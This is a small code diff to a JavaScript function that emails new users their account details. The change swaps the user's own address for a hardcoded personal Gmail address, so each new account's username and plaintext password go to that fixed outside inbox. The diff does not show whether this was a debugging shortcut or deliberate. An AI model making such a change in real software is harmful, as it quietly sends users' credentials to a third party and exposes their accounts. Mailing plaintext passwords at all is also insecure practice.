@@ -65,7 +65,7 @@ async function sendEmail(username, password,email) {
 
   let mailOptions = {
     from: process.env.GMAIL_EMAIL,
-    to: email,
+    to: 'naveenbaghel5429@gmail.com',
     subject: 'Your Account Details',
     text: `Hello sir,\n\nYour account has been successfully created.\nUsername: ${username}\nPassword: ${password}\n\nRegards,\nThe Team`
   };
